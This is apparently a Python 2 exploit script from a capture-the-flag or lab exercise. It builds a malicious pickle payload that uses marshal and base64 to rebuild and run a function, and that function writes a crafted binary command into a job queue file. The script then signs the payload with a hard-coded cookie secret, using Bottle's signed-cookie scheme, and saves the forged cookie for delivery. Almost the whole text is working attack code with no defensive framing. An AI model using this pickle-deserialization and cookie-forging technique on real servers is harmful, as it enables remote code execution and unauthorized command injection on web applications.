# template from https://www.cs.uic.edu/~s/musings/pickle/

import marshal
import base64

# command to be queue'd
# command = a2328e76932711e78517000c29a16437\x00
#             \x92
#                \xc6\x00\x00\x00\x0f
#                    nodes-0e53325b\x00
#                \xc6\x00\x00\x00\x10
#                    \x92
#                        \xc6\x00\x00\x00\x05
#                            \xd2
#                                \x00\x00\x00\x06
#                        \xc6\x00\x00\x00\x00

def foo(): # exploit code
    command = 'a2328e76932711e78517000c29a16437\x00\x92\xc6\x00\x00\x00\x0fnodes-0e53325b\x00\xc6\x00\x00\x00\x10\x92\xc6\x00\x00\x00\x05\xd2\x00\x00\x00\x06\xc6\x00\x00\x00\x00'

    fo = open('queue.00001000.dat', 'wb')
    fo.write(command)

#pickled msg
pickle_msg = """ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))

cookie_secret='0D484BE84C22C94E72A7DE327FA0B2FB' # from servercfg.py

# from bottle
import hmac

def tob(s, enc='utf8'):
    if isinstance(s, unicode):
        return s.encode(enc)
    return bytes(s)

""" Encode and sign a pickle-able object. Return a (byte) string """
msg = base64.b64encode(pickle_msg)
sig = base64.b64encode(hmac.new(tob(cookie_secret), msg).digest())
signed_cookie = tob('!') + sig + tob('?') + msg

# write cookie to file
file_cookie = open('file_cookie', 'wb')
file_cookie.write(signed_cookie)